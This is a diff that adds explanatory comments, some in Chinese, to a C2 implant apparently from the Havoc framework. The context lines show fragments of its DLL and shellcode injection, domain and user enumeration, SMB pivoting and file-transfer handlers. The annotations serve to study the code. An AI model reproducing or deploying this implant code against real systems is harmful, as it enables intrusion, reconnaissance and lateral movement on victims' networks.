@@ -1117,6 +1117,7 @@ VOID CommandInlineExecute( PPARSER Parser )
     MemSet( ObjectData, 0, ObjectDataSize );
 }
 
+// RDI
 VOID CommandInjectDLL( PPARSER Parser )
 {
     PPACKAGE          Package   = PackageCreate( DEMON_COMMAND_INJECT_DLL );
@@ -1199,6 +1200,7 @@ VOID CommandInjectShellcode( PPARSER Parser )
 
     PRINTF( "Inject[%s] Technique[%d] TargetPID:[%d] TargetProcessArch:[%d] ShellcodeSize:[%d]\n", Inject ? "TRUE" : "FALSE", Technique, TargetPID, TargetArch, ShellcodeSize );
 
+    // 注入自己还是注入其他进程
     if ( Inject == 1 )
     {
         // Inject into running process
@@ -1911,6 +1913,7 @@ VOID CommandNet( PPARSER Parser )
 
     switch ( NetCommand )
     {
+        // GetComputerNameExA ComputerNameDnsDomain
         case DEMON_NET_COMMAND_DOMAIN:
         {
             PUTS( "DEMON_NET_COMMAND_DOMAIN" )
@@ -1941,6 +1944,7 @@ VOID CommandNet( PPARSER Parser )
             break;
         }
 
+        //NetWkstaUserEnum 查询当前登录到工作站的用户
         case DEMON_NET_COMMAND_LOGONS:
         {
             PUTS( "DEMON_NET_COMMAND_LOGONS" )
@@ -1962,6 +1966,7 @@ VOID CommandNet( PPARSER Parser )
             UserNameSize = 0;
             do
             {
+                // dwLevel = 0，返回当前登录到工作站的用户的名称。 bufptr 参数指向WKSTA_USER_INFO_0结构的数组
                 NetStatus = Instance.Win32.NetWkstaUserEnum( ServerName, dwLevel, &UserInfo, MAX_PREFERRED_LENGTH, &dwEntriesRead, &dwTotalEntries, &dwResumeHandle );
                 if ( ( NetStatus == NERR_Success ) || ( NetStatus == ERROR_MORE_DATA ) )
                 {
@@ -2008,6 +2013,7 @@ VOID CommandNet( PPARSER Parser )
             return;
         }
 
+        // NetSessionEnum
         case DEMON_NET_COMMAND_SESSIONS:
         {
             PUTS( "DEMON_NET_COMMAND_SESSIONS" )
@@ -2089,6 +2095,7 @@ VOID CommandNet( PPARSER Parser )
             break;
         }
 
+        // NetShareEnum
         case DEMON_NET_COMMAND_SHARE:
         {
             PUTS( "DEMON_NET_COMMAND_SHARE" )
@@ -2130,6 +2137,7 @@ VOID CommandNet( PPARSER Parser )
             break;
         }
 
+        // NetLocalGroupEnum
         case DEMON_NET_COMMAND_LOCALGROUP:
         {
             PUTS( "DEMON_NET_COMMAND_LOCALGROUP" )
@@ -2179,6 +2187,7 @@ VOID CommandNet( PPARSER Parser )
             break;
         }
 
+        // NetGroupEnum
         case DEMON_NET_COMMAND_GROUP:
         {
             PUTS( "DEMON_NET_COMMAND_GROUP" )
@@ -2234,6 +2243,7 @@ VOID CommandNet( PPARSER Parser )
             break;
         }
 
+        // NetUserEnum
         case DEMON_NET_COMMAND_USER:
         {
             PUTS( "DEMON_NET_COMMAND_USER" )
@@ -2297,6 +2307,7 @@ VOID CommandPivot( PPARSER Parser )
 
     switch ( Pivot )
     {
+        // Instance.SmbPivots中存储了当前的所有SMB连接
         case DEMON_PIVOT_LIST:
         {
             PUTS( "DEMON_PIVOT_LIST" )
@@ -2319,6 +2330,7 @@ VOID CommandPivot( PPARSER Parser )
             break;
         }
 
+        // 连接管道取结果，并加入到链表
         case DEMON_PIVOT_SMB_CONNECT:
         {
             PUTS( "DEMON_PIVOT_SMB_CONNECT" )
@@ -2365,6 +2377,7 @@ VOID CommandPivot( PPARSER Parser )
             break;
         }
 
+        // 断开连接，从链表移除
         case DEMON_PIVOT_SMB_DISCONNECT:
         {
             DWORD AgentID = ParserGetInt32( Parser );
@@ -2389,6 +2402,7 @@ VOID CommandPivot( PPARSER Parser )
             PPIVOT_DATA PivotData = NULL;
 
             PRINTF( "Search DemonId => %x\n", DemonId );
+            // 寻找到指定的Demon
             do
             {
                 if ( TempList ) {
@@ -2403,6 +2417,7 @@ VOID CommandPivot( PPARSER Parser )
                 } else break;
             } while ( TRUE );
 
+            // 将数据写入到管道
             if ( PivotData )
             {
                 if ( ! Instance.Win32.WriteFile( PivotData->Handle, Data, Size, &Size, NULL ) )
@@ -2420,6 +2435,7 @@ VOID CommandPivot( PPARSER Parser )
     PackageTransmit( Package, NULL, NULL );
 }
 
+// 与Download相关的命令
 VOID CommandTransfer( PPARSER Parser )
 {
     DWORD          Command  = 0;
